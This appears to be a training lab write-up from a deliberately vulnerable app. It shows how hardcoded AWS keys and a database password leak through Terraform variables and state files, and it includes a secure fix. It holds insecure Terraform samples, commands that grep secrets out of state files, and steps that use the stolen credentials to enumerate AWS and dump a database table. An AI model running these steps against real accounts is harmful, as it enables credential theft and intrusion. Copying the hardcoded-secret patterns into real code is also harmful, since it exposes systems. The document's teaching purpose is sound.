# Lab 02: Credential Extraction from Terraform State

## Objective

Demonstrate how hardcoded credentials in Terraform code and state files can be extracted and used to compromise the AWS account and database.

## Vulnerability Type

- **CWE-798** — Use of Hard-Coded Credentials
- **CWE-200** — Exposure of Sensitive Information
- **Severity**: Critical

## Background

Terraform stores all resource configuration and variable values in state files (`.tfstate`). If these files are:
1. Committed to git
2. Stored in public S3 buckets
3. Accessible in CI/CD logs
4. Not encrypted

Then all hardcoded credentials are exposed.

### Vulnerable Patterns

**Variables.tf**:
```terraform
variable "aws_access_key" {
  default = "AKIAIOSFODNN7EXAMPLE"
}

variable "db_admin_password" {
  default = "MyInsecurePassword123!"
}
```

**Main.tf**:
```terraform
provider "aws" {
  access_key = var.aws_access_key
  secret_key = var.aws_secret_key
}

resource "aws_db_instance" "vulnmcp" {
  username = var.db_admin_username
  password = var.db_admin_password
}
```

**Output**: `.tfstate` file contains:
```json
{
  "resources": [
    {
      "type": "aws_db_instance",
      "instances": [
        {
          "attributes": {
            "password": "MyInsecurePassword123!",
            "username": "admin"
          }
        }
      ]
    }
  ]
}
```

## Lab Exercise

### Scenario

You have access to:
1. The GitHub repository (with variables.tf)
2. A leaked `.tfstate` file from a CI/CD log
3. Or a public S3 bucket with Terraform state

Extract credentials and gain access to AWS and the database.

### Step 1: Extract from Source Code

```bash
# Clone/view the repository
cd /path/to/vulnerable-mcp-app/iac

# Extract credentials from variables.tf
grep -A2 "AKIA\|default.*=" variables.tf | head -20

# Example output:
# default   = "AKIAIOSFODNN7EXAMPLE"
# default   = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

### Step 2: Extract from .tfstate File

```bash
# If you have access to .tfstate
cat terraform.tfstate | grep -i "password\|access_key\|secret"

# Or parse JSON
cat terraform.tfstate | jq '.resources[] | select(.type=="aws_db_instance") | .instances[0].attributes | {username, password}'
```

### Step 3: Use Extracted Credentials

```bash
# Set AWS credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# List S3 buckets (if credentials are valid)
aws s3 ls

# Connect to database
psql -h <rds-endpoint> -U admin -d vulnmcp
# Password: MyInsecurePassword123!
```

### Expected Behavior

**Without fix** (vulnerable):
```bash
# Credentials are in plaintext in:
$ cat variables.tf | grep default
default   = "AKIAIOSFODNN7EXAMPLE"
default   = "MyInsecurePassword123!"

# Credentials are in state file:
$ terraform output -json
{
  "db_password": "MyInsecurePassword123!"
}

# Attacker gains full access to AWS account and database
```

**With fix** (secure):
```bash
# Variables file doesn't contain credentials:
$ cat variables.tf | grep default
(no credentials shown)

# Credentials come from environment variables:
$ env | grep AWS
AWS_ACCESS_KEY_ID=*** (from aws sso or other secure method)

# State file doesn't contain secrets:
$ terraform output
db_password = <sensitive>  # Value hidden
```

## Attack Steps

1. **Find exposed credentials**
   - GitHub repo search: `AKIA` or `aws_secret_access_key`
   - Public S3 buckets with `terraform.tfstate`
   - CI/CD logs
   - Terraform Cloud logs

2. **Validate credentials**
   ```bash
   aws sts get-caller-identity --region us-east-1
   ```

3. **Enumerate AWS account**
   ```bash
   aws ec2 describe-instances
   aws s3 ls
   aws iam list-users
   ```

4. **Access sensitive resources**
   ```bash
   aws rds describe-db-instances
   aws secretsmanager list-secrets
   ```

5. **Extract and compromise database**
   ```bash
   psql -h <rds-endpoint> -U admin -d vulnmcp
   # Query sensitive tables
   SELECT * FROM users;
   ```

## Hints

- Look at `iac/variables.tf` for hardcoded defaults
- Check `iac/main.tf` for how credentials are used
- Review `iac/outputs.tf` for credential leaks
- Search for AWS credential formats: `AKIA` (access keys), `wJalr` (secret key patterns)

## References

- [CWE-798: Use of Hard-Coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [AWS: Temporary Security Credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html)
- [Terraform: Sensitive Data in State](https://www.terraform.io/language/state/sensitive-data)
- [OWASP: Secrets Management](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
